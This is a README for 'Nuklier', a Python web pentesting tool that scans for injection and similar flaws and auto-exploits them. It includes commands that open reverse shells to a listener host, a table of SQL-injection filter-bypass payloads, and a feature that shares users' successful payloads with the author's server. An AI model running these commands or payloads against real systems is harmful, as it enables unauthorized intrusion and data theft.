# ☢️ NUKLIER v15.0

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&pause=1000&color=00FF00&center=true&vCenter=true&random=false&width=600&height=100&lines=AI-Powered+Pentesting;15+Vuln+Types;Auto-Exploit;WAF+Bypass" alt="Typing SVG" />
</p>

<p align="center">
  <a href="https://pypi.org/project/nuklier/">
    <img src="https://img.shields.io/pypi/v/nuklier?color=00ff00&label=PyPI&logo=pypi&logoColor=white&style=for-the-badge" />
  </a>
  <a href="https://github.com/b4ow/Nuklier">
    <img src="https://img.shields.io/github/stars/b4ow/Nuklier?color=00ff00&logo=github&style=for-the-badge" />
  </a>
  <a href="https://nuklier.rf.gd">
    <img src="https://img.shields.io/badge/Docs-nuklier.rf.gd-00ff00?style=for-the-badge" />
  </a>
</p>

---

## ⚡ INSTALL

```bash
pip install nuklier
```

🚀 QUICK START

```bash
# Basic scan
nuklier http://target.com/page.php?id=1

# Auto-exploit with reverse shell
nuklier http://target.com --auto-exploit --lhost 10.0.0.1 --lport 4444

# Multi-target scan
nuklier -l targets.txt --auto-exploit --lhost 10.0.0.1
```

---

✨ FEATURES

```text
┌─────────────────────────────────────────────────────────────────┐
│  ☢️ 15 Vulnerability Types                                     │
│     SQLi | XSS | LFI | RCE | SSTI | SSRF | XXE | GraphQL       │
│     JWT | Open Redirect | CRLF | NoSQL | Host Header | TRACE   │
│     DNS OOB                                                     │
├─────────────────────────────────────────────────────────────────┤
│  ⚡ Auto-Exploit                                                │
│     RCE → Reverse Shell | SSTI → RCE → Shell                    │
│     SQLi → Database Dump | LFI → Log Poisoning → RCE           │
├─────────────────────────────────────────────────────────────────┤
│  🛡️ 15+ WAF Bypass Techniques                                  │
│     Double Encoding | SQL Comments | Case Mutation              │
│     Null Byte | Comment Injection | Unicode Bypass              │
│     Chunked Transfer | Parameter Pollution                      │
├─────────────────────────────────────────────────────────────────┤
│  🤖 Global AI Memory                                            │
│     All users share successful payloads. The more people use   │
│     it, the smarter it gets.                                   │
├─────────────────────────────────────────────────────────────────┤
│  🎯 Zero False Positive                                         │
│     Logic verification with opposite payloads (1=1 vs 1=2)     │
├─────────────────────────────────────────────────────────────────┤
│  📡 Headless Browser                                            │
│     XSS validation with Playwright (no false positives)        │
├─────────────────────────────────────────────────────────────────┤
│  🕷️ Deep Crawling                                               │
│     Depth 5 | Max 200 URLs | Parameter extraction              │
├─────────────────────────────────────────────────────────────────┤
│  🖥️ Callback Server                                             │
│     Auto listener for reverse shells (--server)                │
├─────────────────────────────────────────────────────────────────┤
│  📁 Multi-Target                                                │
│     Parallel scanning from file list (-l)                      │
├─────────────────────────────────────────────────────────────────┤
│  📊 Output Formats                                              │
│     JSON | Burp Suite XML | Console                            │
└─────────────────────────────────────────────────────────────────┘
```

---

📖 USAGE

```text
┌─────────────────────────────────────────────────────────────────┐
│  BASIC SCAN                                                    │
│  $ nuklier http://target.com/page.php?id=1                     │
├─────────────────────────────────────────────────────────────────┤
│  WITH COOKIE                                                   │
│  $ nuklier http://target.com/dashboard.php --cookie "PHPSESSID"│
├─────────────────────────────────────────────────────────────────┤
│  VIA PROXY (Burp)                                              │
│  $ nuklier http://target.com --proxy http://127.0.0.1:8080     │
├─────────────────────────────────────────────────────────────────┤
│  FORCE SCAN ALL PARAMETERS                                     │
│  $ nuklier http://target.com/index.php?cat=1 --force-params    │
├─────────────────────────────────────────────────────────────────┤
│  SAFE MODE (No Reverse Shell)                                  │
│  $ nuklier http://target.com --auto-exploit --safe-mode        │
├─────────────────────────────────────────────────────────────────┤
│  BURP SUITE XML OUTPUT                                         │
│  $ nuklier http://target.com --burp                            │
└─────────────────────────────────────────────────────────────────┘
```

---

🎯 COMMAND LINE OPTIONS

```text
┌───────────────────┬───────────────────┬─────────────────────────────────────────┐
│ OPTION            │ DEFAULT           │ DESCRIPTION                             │
├───────────────────┼───────────────────┼─────────────────────────────────────────┤
│ target            │ -                 │ Target URL                              │
│ -l, --list        │ -                 │ File with list of targets              │
│ --cookie          │ -                 │ Session cookie                          │
│ --proxy           │ -                 │ Proxy URL                               │
│ --threads         │ 30                │ Concurrent threads                      │
│ --timeout         │ 10                │ Request timeout (seconds)               │
│ --dns             │ oast.b4ow.com     │ DNS callback domain                     │
│ --auto-exploit    │ False             │ Auto exploit vulnerabilities            │
│ --safe-mode       │ False             │ Safe mode - no reverse shell            │
│ --lhost           │ -                 │ Local host for reverse shell            │
│ --lport           │ 4444              │ Local port                              │
│ --burp            │ False             │ Burp Suite XML output                   │
│ --server          │ False             │ Start callback server                   │
│ --force-params    │ False             │ Force scan all parameters               │
│ --no-verify       │ False             │ Disable logic verification              │
│ --no-headless     │ False             │ Disable headless browser                │
└───────────────────┴───────────────────┴─────────────────────────────────────────┘
```

---

🛡️ WAF BYPASS TECHNIQUES

```text
┌─────────────────────┬───────────────────────────────────────────────────────────┐
│ TECHNIQUE           │ EXAMPLE                                                   │
├─────────────────────┼───────────────────────────────────────────────────────────┤
│ Double Encoding     │ %2527%2520%254F%2552                                      │
│ SQL Comments        │ /*!50000UNION*/ SELECT                                   │
│ Case Mutation       │ UnIoN SeLeCt                                             │
│ Null Byte           │ ' OR 1=1--\x00                                           │
│ Comment Injection   │ '/**/OR/**/1=1--                                         │
│ Unicode Bypass      │ '％20OR％201％3D％201--                                   │
│ Chunked Transfer    │ Transfer-Encoding: chunked                               │
│ Parameter Pollution │ ?id=1&id=1' OR '1'='1                                    │
└─────────────────────┴───────────────────────────────────────────────────────────┘
```

---

🤖 AI SERVER

```text
┌─────────────────────────────────────────────────────────────────┐
│                                                                    
│                                                                 │
│  📚 LEARNING                                                   │
│     • Every successful payload is shared across all users      │
│     • WAF patterns are collected and analyzed                  │
│     • Bypass payloads are auto-generated from learned patterns │
│                                                                 │
│  📊 STATISTICS                                                 │
│     • Total findings: aggregated from all users                │
│     • Most effective payloads rise to the top                  │
│     • WAF detection patterns improve over time                 │
└─────────────────────────────────────────────────────────────────┘
```

---

📁 OUTPUT

```text
┌─────────────────────────────────────────────────────────────────┐
│  📄 nuklier_xxxxxxxx.json    - Detailed scan results (JSON)    │
│  📄 burp_xxxxxxxx.xml        - Burp Suite compatible XML       │
│  📄 report.html              - Human-readable HTML report      │
│  📄 ai_local.pkl             - Local AI memory (fallback)      │
└─────────────────────────────────────────────────────────────────┘
```

---

🔧 REQUIREMENTS

```text
┌─────────────────────────────────────────────────────────────────┐
│  aiohttp>=3.8.0           # Async HTTP requests                │
│  dnspython>=2.3.0         # DNS OOB detection                  │
│  playwright>=1.40.0       # Optional - XSS validation          │
└─────────────────────────────────────────────────────────────────┘
```

---

💻 COMPATIBILITY

```text
┌─────────────────────────────────────────────────────────────────┐
│  ✅ Kali Linux                                                  │
│  ✅ Ubuntu/Debian                                               │
│  ✅ Termux (Android)                                            │
│  ✅ macOS                                                       │
│  ✅ Windows (WSL)                                               │
│  ✅ Python 3.8+                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

📚 DOCUMENTATION

```text
┌─────────────────────────────────────────────────────────────────┐
│  🌐 Website   : https://nuklier.rf.gd                          │
│  🐙 GitHub    : https://github.com/b4ow/Nuklier                │   
    💬 Telegram  : https://t.me/b-4ow 
│         
│                            
└─────────────────────────────────────────────────────────────────┘
```

---

⚠️ DISCLAIMER

```text
┌─────────────────────────────────────────────────────────────────┐
│  ⚠️ THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY  │
│                                                                 │
│  • Only use on systems you own or have permission              │
│  • Unauthorized access is illegal and unethical                │
│  • The author assumes no responsibility for misuse             │
│  • Always obtain written permission before testing             │
└─────────────────────────────────────────────────────────────────┘
```

---

📝 LICENSE

MIT License — See LICENSE file

---

👤 AUTHOR

```text
┌─────────────────────────────────────────────────────────────────┐
│  b4ow — Security Researcher & Developer                        │
│                                                                 │
│  Telegram : @b-4ow                                              │
│  GitHub   : https://github.com/b4ow                             │
│  Website  : https://nuklier.rf.gd                               │
└─────────────────────────────────────────────────────────────────┘
```

---

<p align="center">
  <b>No system is safe</b>
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=14&duration=3000&pause=1000&color=00FF00&center=true&vCenter=true&width=500&height=30&lines=Made+with+%E2%9D%A4%EF%B8%8F+by+b4ow" />
</p>